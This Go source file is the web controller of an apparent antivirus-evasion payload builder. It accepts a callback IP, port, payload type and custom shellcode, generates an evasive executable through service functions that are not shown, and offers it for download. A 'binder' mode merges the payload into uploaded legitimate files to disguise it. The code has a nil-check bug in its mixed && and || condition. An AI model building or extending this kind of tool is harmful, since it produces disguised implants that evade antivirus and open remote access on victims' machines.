package controller

import (
	"fmt"
	"path"
	"time"

	"coolv0.1/service"
	"github.com/gin-gonic/gin"
)

func Time1(c *gin.Context) { // 耗时多久生成免杀
	start := time.Now()
	c.Next()
	cost := time.Since(start)
	fmt.Printf("const:%v\n", cost)
}

func BypassHandler() gin.HandlerFunc {
	return func(c *gin.Context) {
		bypass := c.PostForm("bypass")
		output := c.PostForm("output")
		ip := c.PostForm("ip")
		port := c.PostForm("port")
		rec_type := c.PostForm("type")
		x64 := c.PostForm("x64")
		choose_shellcode := c.PostForm("choose_shellcode")
		shellcode := c.PostForm("shellcode")
		fileName := service.RandomString(5)
		binder := c.PostForm("binder")
		bindertype := c.PostForm("bindertype")
		binderFile1, _ := c.FormFile("f1")
		binderFile2, _ := c.FormFile("f2")
		binderFile3, _ := c.FormFile("f3")

		if binder == "" {
			service.Bypass_start(bypass, output, ip, port, rec_type, x64, choose_shellcode, shellcode, fileName)
			service.DownloadFile(c, bypass, fileName)
		} else {
			if bindertype == "bindertype1" && binderFile1 != nil {
				// 将读取到的文件保存到本地（服务端本地）
				dst1 := path.Join("./", binderFile1.Filename)
				binderFilePath1 := "./" + binderFile1.Filename // 上传文件的路径
				binderFileName := binderFile1.Filename
				c.SaveUploadedFile(binderFile1, dst1)
				fmt.Println("bindertype1")
				service.BinderBypass_start(bypass, output, ip, port, rec_type, x64, choose_shellcode, shellcode, fileName, binderFilePath1, binderFileName)
				service.BinderDownloadFile(c, binderFileName)
			} else if bindertype == "bindertype2" && binderFile2 != nil || binderFile3 != nil {
				dst2 := path.Join("./", binderFile2.Filename)
				binderFilePath2 := "./" + binderFile2.Filename
				binderFileName2 := binderFile2.Filename
				binderFileName2S := path.Base(binderFileName2)[0 : len(path.Base(binderFileName2))-len(path.Ext(binderFileName2))] //取文件名前缀

				c.SaveUploadedFile(binderFile2, dst2)
				dst3 := path.Join("./", binderFile3.Filename)
				binderFilePath3 := "./" + binderFile3.Filename
				binderFileName3 := binderFile3.Filename
				binderFileName3S := path.Base(binderFileName3)[0 : len(path.Base(binderFileName3))-len(path.Ext(binderFileName3))]
				c.SaveUploadedFile(binderFile3, dst3)
				fmt.Println("bindertype2")
				service.BinderCustom(binderFilePath2, binderFileName2S, binderFilePath3, binderFileName3)
				service.BinderDownloadFile(c, binderFileName3S+"new")
			} else {
				fmt.Println("输入有误！")
			}
		}
	}
}

func IndexHandler(c *gin.Context) {
	c.HTML(200, "index.html", nil)
}

func ErrorHandler(c *gin.Context) {
	c.HTML(200, "error.html", nil)
}
